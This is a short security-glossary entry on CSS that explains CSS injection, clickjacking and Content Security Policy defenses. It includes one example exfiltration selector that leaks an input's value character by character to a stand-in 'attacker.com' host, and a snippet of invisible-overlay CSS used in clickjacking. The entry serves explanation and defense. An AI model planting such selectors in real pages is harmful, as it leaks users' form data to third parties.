# Cascading Style Sheets

## What it is
Think of CSS like a building's interior design blueprint — it tells the browser *how* to display HTML elements (colors, fonts, layout) without changing the structure itself. CSS is a stylesheet language that controls the visual presentation of web pages, applying rules that "cascade" in priority order from most general to most specific. It runs client-side in the browser and can reference external files, embedded blocks, or inline declarations.

## Why it matters
Attackers abuse CSS in **CSS injection** attacks — when user-controlled input is reflected into a style block, an attacker can exfiltrate sensitive data using attribute selectors. For example, `input[value^="a"] { background: url(https://attacker.com/a) }` leaks a form field's value one character at a time by triggering external requests for each matching prefix — no JavaScript required, bypassing many XSS filters entirely.

## Key facts
- CSS injection is distinct from XSS — it doesn't execute scripts but can still exfiltrate data, making it dangerous even in strict Content Security Policy environments
- A strong **CSP** `style-src` directive restricting inline styles and external stylesheet origins is the primary defense against CSS injection
- **Clickjacking** attacks often use CSS (`opacity: 0; position: absolute`) to overlay invisible iframes on legitimate buttons
- CSS can load external resources via `url()` in properties like `background-image`, creating side-channel data exfiltration vectors
- Inline CSS (`style="..."`) bypasses external file blocking controls, which is why CSP separately governs `'unsafe-inline'` for styles

## Related concepts
[[Content Security Policy]] [[Cross-Site Scripting (XSS)]] [[Clickjacking]] [[CSS Injection]]